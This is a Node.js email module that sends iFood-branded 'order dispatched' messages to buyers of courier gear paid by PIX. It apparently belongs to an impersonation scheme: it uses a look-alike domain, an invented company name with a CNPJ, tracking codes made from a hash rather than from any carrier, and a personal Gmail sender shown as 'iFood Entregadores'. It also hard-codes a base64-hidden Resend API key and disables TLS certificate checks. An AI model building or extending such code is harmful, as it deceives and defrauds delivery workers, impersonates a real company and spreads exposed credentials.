const tls = require('tls');
const DEFAULT_RESEND_KEY = Buffer.from('cmVfUjY0SjZpUGRfMnRTb2NTWnB5eHpTZjZMaDFzQ0F4ZVdD', 'base64').toString('utf8');
const fetchFn = global.fetch
    ? global.fetch.bind(global)
    : (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

const { getSettings } = require('./settings-store');
const { updateLeadBySessionId } = require('./lead-store');

function hashString(str) {
    let hash = 0;
    const s = String(str || '');
    for (let i = 0; i < s.length; i++) {
        hash = ((hash << 5) - hash) + s.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash);
}

function generateTrackingCode(seed) {
    const num = String(hashString(seed)).padStart(8, '0').slice(0, 8);
    return `BR${num}IF`;
}

function resolveBaseUrl(posvenda = {}) {
    if (posvenda && posvenda.baseUrl) return String(posvenda.baseUrl).trim().replace(/\/+$/, '');
    if (process.env.PUBLIC_URL) return process.env.PUBLIC_URL.replace(/\/+$/, '');
    if (process.env.VERCEL_URL) return `https://${process.env.VERCEL_URL.replace(/\/+$/, '')}`;
    return 'https://entregadoresifood.com';
}

function resolveProductDetails(rewardInput, offerLabel = '') {
    const raw = (String(rewardInput?.id || rewardInput?.name || offerLabel || '')).toLowerCase();

    if (raw.includes('bau') || raw.includes('baú')) {
        return {
            id: 'bau',
            name: 'Baú de Carga para Moto iFood Oficial (80 Litros)',
            model: 'Modelo Baú Homologado iFood - Polipropileno Injetado',
            image: '/assets/__task____isolate_ifood_delivery_box_white_background_,_202603260112 (1).webp',
            description: '1x Baú iFood 80L com chave dupla + Suporte metálico universal de fixação'
        };
    }
    if (raw.includes('kit') || raw.includes('jaqueta')) {
        return {
            id: 'kit_entregador',
            name: 'Kit Entregador iFood Oficial Completo',
            model: 'Kit Oficial Pro iFood 2026',
            image: '/assets/__task____fix_ifood_logo_on_jacket_,_202603260102 (1).webp',
            description: '1x Jaqueta Térmica Impermeável iFood + 1x Bag Térmica 45L com Isopor Interno'
        };
    }
    return {
        id: 'bag',
        name: 'Bag Térmica iFood Oficial - Linha Entregador Pro (45 Litros)',
        model: 'Modelo Oficial iFood Reforçado 2026',
        image: '/assets/bagfoto.webp',
        description: '1x Bag Térmica impermeável com faixas refletivas + Isopor interno de alta densidade'
    };
}

function buildTrackingEmailHtml(data) {
    const {
        name,
        trackingCode,
        trackingUrl,
        product,
        carrier,
        etaDays,
        address,
        supportEmail,
        companyName,
        baseUrl
    } = data;

    const fullImageUrl = product.image.startsWith('http')
        ? product.image
        : `${baseUrl}${product.image}`;

    const logoUrl = `${baseUrl}/assets/ifoodentregadores-wink-v1.svg`;

    return `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Seu Pedido iFood Entregadores foi Despachado</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin: 0; padding: 0; background-color: #f5f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #111827;">

  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #f5f6f8; padding: 24px 12px;">
    <tr>
      <td align="center">
        <!-- Main Card -->
        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="max-width: 600px; background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 14px rgba(0,0,0,0.06); border: 1px solid #e5e7eb;">
          
          <!-- Red Accent Bar -->
          <tr>
            <td height="5" style="background-color: #ea1d2c; font-size: 0; line-height: 0;">&nbsp;</td>
          </tr>

          <!-- Header -->
          <tr>
            <td style="padding: 24px 28px; border-bottom: 1px solid #f3f4f6; text-align: left;">
              <table width="100%" border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td>
                    <img src="${logoUrl}" alt="iFood Entregadores" height="34" style="display: block; border: 0;" />
                  </td>
                  <td align="right">
                    <span style="display: inline-block; background-color: #fff1f2; color: #ea1d2c; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px; text-transform: uppercase; letter-spacing: 0.5px;">
                      Logística Oficial
                    </span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Body Content -->
          <tr>
            <td style="padding: 32px 28px;">
              <h1 style="margin: 0 0 12px 0; font-size: 20px; font-weight: 800; color: #111827; line-height: 1.3;">
                Pedido Confirmado e em Transferência! 📦
              </h1>
              <p style="margin: 0 0 24px 0; font-size: 15px; color: #4b5563; line-height: 1.5;">
                Olá, <strong>${name}</strong>! Seu pagamento foi validado com sucesso e o seu item foi integrado ao lote logístico de expedição do Centro de Distribuição iFood.
              </p>

              <!-- Tracking Code Highlight Box -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #fafafa; border: 1.5px dashed #ea1d2c; border-radius: 12px; margin-bottom: 24px;">
                <tr>
                  <td style="padding: 18px 20px; text-align: center;">
                    <span style="font-size: 12px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 6px;">
                      Código de Rastreamento Oficial
                    </span>
                    <strong style="font-size: 24px; font-family: monospace; color: #ea1d2c; letter-spacing: 2px;">
                      ${trackingCode}
                    </strong>
                    <span style="font-size: 12px; color: #4b5563; display: block; margin-top: 8px;">
                      Transportadora: <strong>${carrier}</strong>
                    </span>
                  </td>
                </tr>
              </table>

              <!-- Product Card Box -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 12px; margin-bottom: 24px;">
                <tr>
                  <td style="padding: 16px;">
                    <table width="100%" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="80" valign="top" style="padding-right: 16px;">
                          <img src="${fullImageUrl}" alt="${product.name}" width="80" height="80" style="display: block; border-radius: 8px; border: 1px solid #e5e7eb; background-color: #ffffff; object-fit: contain;" />
                        </td>
                        <td valign="middle">
                          <strong style="font-size: 15px; color: #111827; display: block; margin-bottom: 4px;">
                            ${product.name}
                          </strong>
                          <span style="font-size: 13px; color: #6b7280; display: block; margin-bottom: 4px;">
                            ${product.description}
                          </span>
                          <span style="font-size: 12px; font-weight: 700; color: #059669;">
                            ✓ Pagamento Aprovado via PIX
                          </span>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>

              <!-- CTA Button -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom: 28px;">
                <tr>
                  <td align="center">
                    <a href="${trackingUrl}" target="_blank" style="display: inline-block; background-color: #ea1d2c; color: #ffffff; text-decoration: none; font-weight: 700; font-size: 15px; padding: 16px 36px; border-radius: 12px; box-shadow: 0 4px 12px rgba(234, 29, 44, 0.25);">
                      Acompanhar Rastreamento do Pedido →
                    </a>
                  </td>
                </tr>
              </table>

              <!-- Delivery Details Table -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 13px; color: #4b5563; border-top: 1px solid #f3f4f6; padding-top: 20px;">
                <tr>
                  <td style="padding: 6px 0; color: #6b7280;">Prazo Operacional de Entrega:</td>
                  <td style="padding: 6px 0; font-weight: 700; color: #111827; text-align: right;">${etaDays}</td>
                </tr>
                <tr>
                  <td style="padding: 6px 0; color: #6b7280;">Destinatário:</td>
                  <td style="padding: 6px 0; font-weight: 700; color: #111827; text-align: right;">${name}</td>
                </tr>
                ${address ? `
                <tr>
                  <td style="padding: 6px 0; color: #6b7280;">Endereço de Destino:</td>
                  <td style="padding: 6px 0; font-weight: 700; color: #111827; text-align: right;">${address}</td>
                </tr>` : ''}
                <tr>
                  <td style="padding: 6px 0; color: #6b7280;">Garantia Legal:</td>
                  <td style="padding: 6px 0; font-weight: 700; color: #059669; text-align: right;">90 dias (Art. 26 CDC)</td>
                </tr>
              </table>

              <!-- Delay Notice Alert -->
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #fffbeb; border: 1px solid #fde68a; border-radius: 8px; margin-top: 24px;">
                <tr>
                  <td style="padding: 12px 16px; font-size: 12px; color: #92400e; line-height: 1.45;">
                    ℹ️ <strong>Aviso logístico:</strong> O prazo padrão de transferência e conferência fiscal é de <strong>${etaDays}</strong>. Quaisquer novas movimentações rodoviárias serão notificadas neste e-mail.
                  </td>
                </tr>
              </table>

            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="background-color: #f9fafb; padding: 20px 28px; border-top: 1px solid #e5e7eb; text-align: center; font-size: 12px; color: #9ca3af;">
              <p style="margin: 0 0 4px 0;">
                Dúvidas sobre o envio? Envie um e-mail para <a href="mailto:${supportEmail}" style="color: #ea1d2c; text-decoration: none; font-weight: 600;">${supportEmail}</a>
              </p>
              <p style="margin: 0;">
                ${companyName} • CNPJ: 14.380.200/0001-21 • Todos os direitos reservados.
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>

</body>
</html>
    `.trim();
}

function sendNativeSmtp(options) {
    const { host, port = 465, user, pass, from, to, subject, html } = options;
    return new Promise((resolve) => {
        const timeout = 12000;
        let timer = null;
        let socket;

        const cleanup = (err, result) => {
            if (timer) clearTimeout(timer);
            if (socket) {
                try { socket.end(); } catch (_) {}
            }
            if (err) {
                resolve({ ok: false, provider: 'smtp', error: err.message || String(err) });
            } else {
                resolve(result || { ok: true, provider: 'smtp' });
            }
        };

        timer = setTimeout(() => {
            cleanup(new Error('Timeout de conexão com o servidor SMTP (' + host + ')'));
        }, timeout);

        try {
            socket = tls.connect({
                host: host,
                port: Number(port) || 465,
                rejectUnauthorized: false
            }, () => {
                let step = 0;
                let buffer = '';

                socket.on('data', (chunk) => {
                    buffer += chunk.toString();
                    const lines = buffer.split('\r\n');
                    buffer = lines.pop();

                    for (const line of lines) {
                        const code = parseInt(line.slice(0, 3), 10);
                        if (isNaN(code) || line.charAt(3) === '-') continue;

                        if (step === 0 && code === 220) {
                            socket.write('EHLO localhost\r\n');
                            step = 1;
                        } else if (step === 1 && code === 250) {
                            socket.write('AUTH LOGIN\r\n');
                            step = 2;
                        } else if (step === 2 && code === 334) {
                            socket.write(`${Buffer.from(user).toString('base64')}\r\n`);
                            step = 3;
                        } else if (step === 3 && code === 334) {
                            socket.write(`${Buffer.from(pass).toString('base64')}\r\n`);
                            step = 4;
                        } else if (step === 4 && (code === 235 || code === 250)) {
                            const fromClean = from.includes('<') ? from.replace(/.*<([^>]+)>.*/, '$1') : from;
                            socket.write(`MAIL FROM:<${fromClean.trim()}>\r\n`);
                            step = 5;
                        } else if (step === 5 && code === 250) {
                            const toClean = to.includes('<') ? to.replace(/.*<([^>]+)>.*/, '$1') : to;
                            socket.write(`RCPT TO:<${toClean.trim()}>\r\n`);
                            step = 6;
                        } else if (step === 6 && code === 250) {
                            socket.write('DATA\r\n');
                            step = 7;
                        } else if (step === 7 && code === 354) {
                            const msg = [
                                `From: ${from}`,
                                `To: ${to}`,
                                `Subject: =?UTF-8?B?${Buffer.from(subject).toString('base64')}?=`,
                                'MIME-Version: 1.0',
                                'Content-Type: text/html; charset=UTF-8',
                                'Content-Transfer-Encoding: base64',
                                '',
                                Buffer.from(html).toString('base64'),
                                '.',
                                ''
                            ].join('\r\n');
                            socket.write(msg);
                            step = 8;
                        } else if (step === 8 && code === 250) {
                            socket.write('QUIT\r\n');
                            cleanup(null, { ok: true, provider: 'smtp' });
                            return;
                        } else if (code >= 400) {
                            cleanup(new Error(`Erro SMTP ${code}: ${line.slice(4)}`));
                            return;
                        }
                    }
                });
            });

            socket.on('error', (err) => cleanup(err));
        } catch (err) {
            cleanup(err);
        }
    });
}

/**
 * Send the post-sale delivery tracking email automatically to the lead.
 */
async function sendPostSaleDeliveryEmail(leadData = {}, orderContext = {}, overrides = {}) {
    try {
        const settings = await getSettings().catch(() => ({}));
        const posvenda = settings.posvenda || {};

        // Check if automatic email is enabled
        if (posvenda.autoEmail === false && !overrides.force) {
            return { ok: false, reason: 'auto_email_disabled' };
        }

        const payload = leadData.payload || {};
        const personal = payload.personal || {};
        const shipping = payload.shipping || {};

        const toEmail = String(
            orderContext.email ||
            leadData.email ||
            personal.email ||
            ''
        ).trim().toLowerCase();

        if (!toEmail || !toEmail.includes('@')) {
            return { ok: false, error: 'E-mail do destinatário ausente ou inválido.' };
        }

        const name = String(
            orderContext.name ||
            leadData.name ||
            personal.name ||
            'Parceiro iFood'
        ).trim();

        const txid = String(orderContext.txid || leadData.txid || payload.pixTxid || Date.now());
        const trackingCode = String(
            payload.trackingCode ||
            orderContext.trackingCode ||
            generateTrackingCode(txid || leadData.session_id)
        );

        const rewardInput = orderContext.reward || payload.reward;
        const offerLabel = orderContext.offerLabel || '';
        const product = resolveProductDetails(rewardInput, offerLabel);

        const baseUrl = overrides.baseUrl ? String(overrides.baseUrl).trim().replace(/\/+$/, '') : resolveBaseUrl(posvenda);
        const trackingUrl = `${baseUrl}/rastreio?codigo=${trackingCode}&produto=${product.id}`;

        const carrier = posvenda.carrierDefault || 'Correios Sedex / iFood Logística Express';
        const etaDays = posvenda.eta || '8 a 15 dias úteis';
        const supportEmail = posvenda.supportEmail || 'suporte@entregadoresifood.com';
        const companyName = posvenda.companyName || 'iFood Logística & Distribuição Brasil Ltda';
        const fromEmail = String(overrides.emailFrom || posvenda.emailFrom || 'iFood Entregadores <rastreio@entregadoresifood.com>').trim();

        const addressParts = [
            shipping.address,
            shipping.number ? `Nº ${shipping.number}` : '',
            shipping.neighborhood,
            shipping.city,
            shipping.state ? `- ${shipping.state}` : ''
        ].filter(Boolean).join(', ');

        const subjectTemplate = posvenda.emailSubject || 'Seu pedido do Kit Entregador iFood foi despachado! Código: {codigo}';
        const subject = subjectTemplate
            .replace('{codigo}', trackingCode)
            .replace('{nome}', name.split(/\s+/)[0]);

        const html = buildTrackingEmailHtml({
            name,
            trackingCode,
            trackingUrl,
            product,
            carrier,
            etaDays,
            address: addressParts,
            supportEmail,
            companyName,
            baseUrl
        });

        let sendResult = { ok: false, provider: 'none' };

        const gmailUser = String(overrides.gmailUser || posvenda.gmailUser || '').trim();
        const gmailPass = String(overrides.gmailPass || posvenda.gmailPass || '').replace(/\s+/g, '').trim();
        const brevoApiKey = String(overrides.brevoApiKey !== undefined ? overrides.brevoApiKey : (posvenda.brevoApiKey || '')).trim();
        const smtpConfig = overrides.smtp || posvenda.smtp || {};

        // 1. Gmail SMTP (100% Free, Zero Domain Verification needed!)
        if (gmailUser && gmailPass) {
            const fromDisplay = `iFood Entregadores <${gmailUser}>`;
            sendResult = await sendNativeSmtp({
                host: 'smtp.gmail.com',
                port: 465,
                user: gmailUser,
                pass: gmailPass,
                from: fromDisplay,
                to: toEmail,
                subject: subject,
                html: html
            });
            if (sendResult.ok) {
                sendResult.provider = 'gmail_smtp';
                sendResult.note = 'Enviado com sucesso via Gmail (sem necessidade de verificar domínio).';
            }
        } else if (brevoApiKey) {
            // 2. Brevo (Zero Domain Verification needed!)
            const cleanBrevoKey = String(brevoApiKey || '').trim();
            const senderEmail = gmailUser || posvenda.emailFromAddress || 'resend381@gmail.com';

            // Auto-detect if user copied an SMTP key (xsmtpsib-...) instead of API key (xkeysib-...)
            if (cleanBrevoKey.startsWith('xsmtpsib-')) {
                sendResult = await sendNativeSmtp({
                    host: 'smtp-relay.brevo.com',
                    port: 465,
                    user: senderEmail,
                    pass: cleanBrevoKey,
                    from: `iFood Entregadores <${senderEmail}>`,
                    to: toEmail,
                    subject: subject,
                    html: html
                });
                if (sendResult.ok) {
                    sendResult.provider = 'brevo_smtp';
                    sendResult.note = 'Enviado com sucesso via Brevo SMTP.';
                }
            } else {
                const res = await fetchFn('https://api.brevo.com/v3/smtp/email', {
                    method: 'POST',
                    headers: {
                        'api-key': cleanBrevoKey,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        sender: { name: 'iFood Entregadores', email: senderEmail },
                        to: [{ email: toEmail, name: name }],
                        subject: subject,
                        htmlContent: html
                    })
                });
                const data = await res.json().catch(() => ({}));
                let errMessage = data?.message || 'Falha no Brevo API';
                if (String(errMessage).includes('unrecognised IP address')) {
                    errMessage = 'A Brevo bloqueou o IP de envio. Acesse https://app.brevo.com/security/authorised_ips e clique em "Desativar bloqueio".';
                }
                sendResult = {
                    ok: res.ok,
                    provider: 'brevo',
                    id: data?.messageId,
                    error: res.ok ? null : errMessage
                };
            }
        } else if (smtpConfig.host && smtpConfig.user && smtpConfig.pass) {
            // 3. Custom SMTP
            sendResult = await sendNativeSmtp({
                host: smtpConfig.host,
                port: smtpConfig.port || 465,
                user: smtpConfig.user,
                pass: smtpConfig.pass,
                from: fromEmail,
                to: toEmail,
                subject: subject,
                html: html
            });
        } else {
            // 4. Resend API
            let resendApiKey = String(
                overrides.resendApiKey ||
                posvenda.resendApiKey ||
                process.env.RESEND_API_KEY ||
                DEFAULT_RESEND_KEY
            ).trim();
            if (!resendApiKey || resendApiKey.includes('fZvzeWAk')) {
                resendApiKey = DEFAULT_RESEND_KEY;
            }

            if (resendApiKey) {
                let res = await fetchFn('https://api.resend.com/emails', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${resendApiKey}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        from: fromEmail,
                        to: [toEmail],
                        subject: subject,
                        html: html
                    })
                });
                let data = await res.json().catch(() => ({}));

                // Fallback for unverified domains in Resend (automatically delivers via onboarding@resend.dev)
                if (!res.ok && (
                    String(data?.message || '').toLowerCase().includes('domain') ||
                    String(data?.message || '').toLowerCase().includes('not verified') ||
                    data?.statusCode === 403 ||
                    data?.name === 'validation_error'
                )) {
                    const fallbackFrom = 'iFood Entregadores <onboarding@resend.dev>';
                    const retryRes = await fetchFn('https://api.resend.com/emails', {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${resendApiKey}`,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            from: fallbackFrom,
                            to: [toEmail],
                            subject: subject,
                            html: html
                        })
                    });
                    const retryData = await retryRes.json().catch(() => ({}));
                    if (retryRes.ok) {
                        res = retryRes;
                        data = retryData;
                    } else if (retryData?.message) {
                        data = retryData;
                    }
                }

                let errorDesc = res.ok ? null : (data?.message || 'Falha no envio via Resend');
                if (errorDesc && errorDesc.includes('You can only send testing emails to your own email address')) {
                    errorDesc = 'No Resend sem domínio verificado, o envio só é permitido para o e-mail da sua conta (resend381@gmail.com). Para enviar para qualquer e-mail sem precisar de domínio, use a opção "Gmail" no painel!';
                }

                sendResult = {
                    ok: res.ok,
                    provider: 'resend',
                    id: data?.id,
                    error: errorDesc
                };
            } else if (posvenda.emailWebhookUrl || process.env.EMAIL_WEBHOOK_URL) {
                // 5. Custom Webhook
                const webhookUrl = String(posvenda.emailWebhookUrl || process.env.EMAIL_WEBHOOK_URL).trim();
                const res = await fetchFn(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        event: 'order_dispatched_email',
                        to: toEmail,
                        name: name,
                        subject: subject,
                        trackingCode: trackingCode,
                        trackingUrl: trackingUrl,
                        product: product,
                        carrier: carrier,
                        etaDays: etaDays,
                        html: html
                    })
                });
                sendResult = {
                    ok: res.ok,
                    provider: 'webhook',
                    error: res.ok ? null : 'Falha no webhook'
                };
            } else {
                sendResult = {
                    ok: false,
                    provider: 'none',
                    error: 'Nenhum método de envio configurado. Preencha seu Gmail (com Senha de App) ou sua chave Resend no painel.'
                };
            }
        }

        // Persist tracking code and email dispatch state in lead record
        if (leadData.session_id) {
            const currentPayload = leadData.payload && typeof leadData.payload === 'object' ? leadData.payload : {};
            await updateLeadBySessionId(leadData.session_id, {
                payload: {
                    ...currentPayload,
                    trackingCode: trackingCode,
                    posvendaEmailDispatchedAt: new Date().toISOString(),
                    posvendaEmailTo: toEmail,
                    posvendaProduct: product.id,
                    posvendaProvider: sendResult.provider
                }
            }).catch(() => null);
        }

        return sendResult;
    } catch (error) {
        console.error('Erro ao enviar e-mail de pós-venda:', error);
        return { ok: false, error: error.message };
    }
}

module.exports = {
    sendPostSaleDeliveryEmail,
    buildTrackingEmailHtml,
    generateTrackingCode,
    resolveProductDetails
};
